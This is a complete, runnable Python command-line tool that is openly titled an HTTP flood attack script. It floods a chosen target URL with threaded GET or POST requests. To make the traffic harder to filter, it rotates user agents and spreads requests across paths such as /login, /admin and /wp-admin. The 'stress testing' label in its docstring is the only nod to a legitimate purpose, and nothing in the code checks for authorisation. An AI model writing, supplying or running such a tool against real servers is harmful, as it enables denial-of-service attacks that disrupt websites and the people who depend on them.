#!/usr/bin/env python

"""
HTTP Flood Attack Script
- Floods target web server with HTTP requests
- Used for application layer stress testing
"""

import requests
import argparse
import time
import random
import threading
from datetime import datetime
from fake_useragent import UserAgent

# Initialize the UserAgent
try:
    ua = UserAgent()
except:
    ua = None
    print("[!] Warning: fake-useragent package not found or failed to load.")
    print("[!] Using a limited set of user agents instead.")
    
# Fallback user agents in case the package is not available
FALLBACK_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
]

# List of common HTTP paths to request
PATHS = [
    "/",
    "/index.html",
    "/about",
    "/contact",
    "/login",
    "/register",
    "/products",
    "/services",
    "/blog",
    "/news",
    "/api/users",
    "/api/data",
    "/admin",
    "/wp-admin",
    "/search"
]

# Global counters
request_count = 0
successful_requests = 0
failed_requests = 0

def get_random_user_agent():
    """Get a random User-Agent string"""
    if ua:
        try:
            return ua.random
        except:
            pass
    return random.choice(FALLBACK_UAS)

def http_request(url, method="GET"):
    """Make an HTTP request to the target"""
    global request_count, successful_requests, failed_requests
    
    headers = {
        'User-Agent': get_random_user_agent(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Connection': 'keep-alive',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
    }
    
    try:
        if method == "GET":
            # Randomize path for more realistic attack
            path = random.choice(PATHS)
            target_url = f"{url}{path}"
            response = requests.get(
                target_url,
                headers=headers,
                timeout=3,
                allow_redirects=False
            )
        else:  # POST
            # Random form data for POST request
            data = {
                'username': f'user{random.randint(1, 1000)}',
                'password': f'pass{random.randint(1000, 9999)}',
                'email': f'user{random.randint(1, 1000)}@example.com'
            }
            response = requests.post(
                url,
                headers=headers,
                data=data,
                timeout=3,
                allow_redirects=False
            )
        
        # Update counters
        request_count += 1
        if 200 <= response.status_code < 400:
            successful_requests += 1
        else:
            failed_requests += 1
            
        return True
        
    except requests.exceptions.RequestException:
        # Update counters
        request_count += 1
        failed_requests += 1
        return False

def worker(url, method, tid):
    """Worker function for threading"""
    while not stop_event.is_set():
        success = http_request(url, method)
        time.sleep(random.uniform(0.01, 0.1))  # Small random delay

def http_flood(target_url, duration=60, threads=10, method="GET"):
    """
    Execute an HTTP Flood attack against the target
    
    :param target_url: Target URL
    :param duration: Attack duration in seconds
    :param threads: Number of threads to use
    :param method: HTTP method (GET or POST)
    """
    global request_count, successful_requests, failed_requests, stop_event
    
    # Make sure URL is properly formatted
    if not target_url.startswith("http"):
        target_url = "http://" + target_url
    
    print(f"[*] Starting HTTP Flood attack against {target_url}")
    print(f"[*] Method: {method}")
    print(f"[*] Using {threads} threads")
    print(f"[*] Attack will run for {duration} seconds")
    print(f"[*] Started at: {datetime.now().strftime('%H:%M:%S')}")
    
    # Reset counters
    request_count = 0
    successful_requests = 0
    failed_requests = 0
    
    # Create and start threads
    stop_event = threading.Event()
    thread_list = []
    
    for i in range(threads):
        t = threading.Thread(target=worker, args=(target_url, method, i))
        t.daemon = True
        thread_list.append(t)
        t.start()
    
    # Track start time
    start_time = time.time()
    
    try:
        # Continue until duration is reached
        while time.time() - start_time < duration:
            elapsed = time.time() - start_time
            time.sleep(1)
            
            # Print status every second
            print(f"\r[*] Requests: {request_count} | Success: {successful_requests} | Failed: {failed_requests} | Elapsed: {elapsed:.2f}s", end="")
            
    except KeyboardInterrupt:
        print("\n[!] Attack interrupted by user")
    
    # Stop all threads
    stop_event.set()
    
    for t in thread_list:
        t.join(1)  # Give each thread 1 second to exit
    
    # Print final statistics
    total_time = time.time() - start_time
    print(f"\n\n[*] Attack completed")
    print(f"[*] Total requests: {request_count}")
    print(f"[*] Successful requests: {successful_requests}")
    print(f"[*] Failed requests: {failed_requests}")
    print(f"[*] Total time: {total_time:.2f} seconds")
    print(f"[*] Request rate: {request_count/total_time:.2f} requests/second")

if __name__ == "__main__":
    # Setup argument parser
    parser = argparse.ArgumentParser(description='HTTP Flood Attack Tool')
    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g., http://example.com)')
    parser.add_argument('-d', '--duration', type=int, default=30, help='Attack duration in seconds (default: 30)')
    parser.add_argument('-n', '--threads', type=int, default=10, help='Number of threads to use (default: 10)')
    parser.add_argument('-m', '--method', choices=['GET', 'POST'], default='GET', help='HTTP method to use (default: GET)')
    
    args = parser.parse_args()
    
    # Execute attack
    http_flood(args.target, args.duration, args.threads, args.method)
